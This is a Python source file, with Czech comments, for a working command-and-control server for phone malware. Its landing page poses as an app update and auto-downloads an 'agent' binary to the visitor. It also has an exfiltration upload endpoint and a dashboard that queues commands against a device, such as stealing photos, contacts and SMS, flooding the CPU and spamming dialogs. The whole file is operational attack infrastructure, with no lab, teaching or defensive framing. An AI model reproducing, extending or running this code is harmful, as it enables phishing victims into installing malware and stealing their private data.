#!/usr/bin/env python3
"""
C2 server s phishing stránkou pro QR kód (bez cgi modulu)

Endpointy:
  GET  /                      phishing stránka (auto-download po 2 s)
  GET  /agent                 stažení agenta (attachment)
  GET  /task?id=<agent>       agent polluje příkazy
  POST /result                agent posílá výsledky (JSON)
  POST /upload?...            exfiltrace dat (raw body)
  GET  /push?id=&cmd=         zařazení příkazu (GET i POST form)
  GET  /dashboard             ovládací panel
  GET  /queue                 stav fronty
  GET  /files                 seznam exfiltrovaných souborů
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote_plus
import json
import os
from datetime import datetime

PORT = 8080
DATA_DIR = "exfil"
os.makedirs(DATA_DIR, exist_ok=True)

tasks = {}      # agent_id -> [cmd, ...]
results = {}    # agent_id -> poslední výsledek
events = []     # log událostí


def log(ev):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {ev}"
    events.append(line)
    print(line, flush=True)


class ReusableServer(HTTPServer):
    allow_reuse_address = True
    daemon_threads = True


class QRHandler(BaseHTTPRequestHandler):
    def _send(self, code, body, ctype="text/html; charset=utf-8", extra=None):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        try:
            self.wfile.write(body)
        except BrokenPipeError:
            pass

    def do_GET(self):
        u = urlparse(self.path)
        p = u.path
        q = parse_qs(u.query)

        if p == "/":
            self._send(200, PHISH_HTML)

        elif p == "/agent":
            if os.path.exists("agent"):
                with open("agent", "rb") as f:
                    data = f.read()
                self._send(200, data, "application/octet-stream",
                           {"Content-Disposition": "attachment; filename=agent"})
                log("📥 agent stáhnut (download)")
            else:
                self._send(404, "agent binary not found", "text/plain")

        elif p == "/task":
            aid = q.get("id", ["unknown"])[0]
            if tasks.get(aid):
                cmd = tasks[aid].pop(0)
                self._send(200, json.dumps({"cmd": cmd}), "application/json")
                log(f"→ task for {aid}: {cmd}")
            else:
                self._send(204, "", "text/plain")

        elif p == "/push":
            aid = q.get("id", ["redmi"])[0]
            cmd = q.get("cmd", ["info"])[0]
            tasks.setdefault(aid, []).append(cmd)
            log(f"queued for {aid}: {cmd}")
            self._send(200, f"queued for {aid}: {cmd}", "text/plain")

        elif p == "/queue":
            self._send(200, json.dumps({"tasks": tasks, "results": results}, indent=2),
                       "application/json")

        elif p == "/files":
            files = sorted(os.listdir(DATA_DIR))
            self._send(200, json.dumps(files, indent=2), "application/json")

        elif p == "/dashboard":
            self._send(200, self._dashboard())

        else:
            self._send(404, "not found", "text/plain")

    def do_POST(self):
        u = urlparse(self.path)
        p = u.path
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""

        if p == "/result":
            try:
                data = json.loads(raw)
                aid = data.get("id", "unknown")
                results[aid] = data
                log(f"← [{aid}] {data.get('cmd')} => {data.get('result')}")
            except Exception as e:
                log(f"result parse error: {e}")
            self._send(200, "OK", "text/plain")

        elif p == "/upload":
            q = parse_qs(u.query)
            aid = q.get("id", ["unknown"])[0]
            dtype = q.get("type", ["data"])[0]
            name = q.get("name", ["data.txt"])[0]
            safe = "".join(c for c in name if c.isalnum() or c in "._-") or "data.txt"
            fp = os.path.join(DATA_DIR, f"{aid}_{dtype}_{safe}")
            with open(fp, "w") as f:
                f.write(raw)
            log(f"📥 exfil {aid}: {dtype}/{safe} ({len(raw)} B) -> {fp}")
            self._send(200, "OK", "text/plain")

        elif p == "/push":
            # podpora form-urlencoded i query
            form = {k: v[0] for k, v in parse_qs(raw).items()}
            q = {k: v[0] for k, v in parse_qs(u.query).items()}
            merged = {**q, **form}
            aid = merged.get("id", "redmi")
            cmd = merged.get("cmd", "info")
            tasks.setdefault(aid, []).append(cmd)
            log(f"queued for {aid}: {cmd}")
            self._send(303, "", "text/plain", {"Location": "/dashboard"})

        else:
            self._send(404, "not found", "text/plain")

    def _dashboard(self):
        files = sorted(os.listdir(DATA_DIR)) if os.path.exists(DATA_DIR) else []
        ev = "\n".join(events[-40:]) or "(zatím nic)"
        return DASH_HTML.replace("__FILES__", json.dumps(files, indent=2)).replace(
            "__EVENTS__", ev).replace("__RESULTS__", json.dumps(results, indent=2, ensure_ascii=False))

    def log_message(self, fmt, *args):
        pass  # vlastní log()


PHISH_HTML = """<!DOCTYPE html>
<html lang="cs"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Aktualizace aplikace</title>
<style>
body{font-family:Arial,sans-serif;text-align:center;padding:24px;
background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;margin:0}
.box{max-width:420px;margin:6vh auto;background:rgba(255,255,255,.12);
padding:32px;border-radius:16px}
h1{margin:0 0 12px}.btn{display:inline-block;padding:16px 34px;background:#4CAF50;
color:#fff;text-decoration:none;border-radius:8px;font-size:19px;margin-top:18px}
.btn:hover{background:#45a049}.muted{margin-top:18px;font-size:13px;opacity:.85}
</style></head><body>
<div class="box">
<h1>📱 Stáhnout aplikaci</h1>
<p>Klepněte na tlačítko pro stažení souboru.</p>
<a href="/agent" class="btn">⬇️ Stáhnout</a>
<p class="muted">Po stažení soubor najdete v <b>Stahování</b>.</p>
</div>
<script>setTimeout(function(){window.location.href='/agent';},2500);</script>
</body></html>"""


DASH_HTML = """<!DOCTYPE html>
<html lang="cs"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>C2 Dashboard</title>
<style>
body{font-family:Consolas,monospace;background:#0f0f1e;color:#d8d8e8;padding:18px;margin:0}
h1{color:#7a8bff}.sec{background:#181830;padding:16px;border-radius:10px;margin:12px 0}
select,input,button{padding:9px;border-radius:6px;border:none;font-size:14px}
button{background:#4CAF50;color:#fff;cursor:pointer}button:hover{background:#45a049}
pre{background:#0a0a16;padding:12px;border-radius:8px;overflow-x:auto;white-space:pre-wrap}
a.act{color:#7a8bff}
</style></head><body>
<h1>🎯 C2 Dashboard</h1>
<div class="sec"><h3>Zařadit příkaz</h3>
<form method="POST" action="/push">
<input type="hidden" name="id" value="redmi">
<select name="cmd">
<option value="info">info</option>
<option value="exfil_photos">exfil_photos</option>
<option value="exfil_contacts">exfil_contacts</option>
<option value="exfil_sms">exfil_sms</option>
<option value="exfil_all">exfil_all</option>
<option value="dialog_spam:5">dialog_spam:5</option>
<option value="touch_spam:5">touch_spam:5</option>
<option value="screenshot_loop:5">screenshot_loop:5</option>
<option value="wifi_toggle:3">wifi_toggle:3</option>
<option value="cpu_flood:3">cpu_flood:3</option>
<option value="app_spam:3">app_spam:3</option>
<option value="vibrate:5">vibrate:5</option>
<option value="full_chaos">full_chaos</option>
<option value="stop">stop</option>
</select>
<button type="submit">Odeslat</button></form>
<p>Fronta: <a class="act" href="/queue">/queue</a> &nbsp; Soubory: <a class="act" href="/files">/files</a></p>
</div>
<div class="sec"><h3>Exfiltrované soubory (./exfil/)</h3><pre>__FILES__</pre></div>
<div class="sec"><h3>Výsledky</h3><pre>__RESULTS__</pre></div>
<div class="sec"><h3>Event log</h3><pre>__EVENTS__</pre></div>
</body></html>"""


if __name__ == "__main__":
    srv = ReusableServer(("", PORT), QRHandler)
    print(f"🚀 C2 server na http://0.0.0.0:{PORT}", flush=True)
    print(f"   Phishing:  http://<IP>:{PORT}/", flush=True)
    print(f"   Dashboard: http://<IP>:{PORT}/dashboard", flush=True)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("bye")
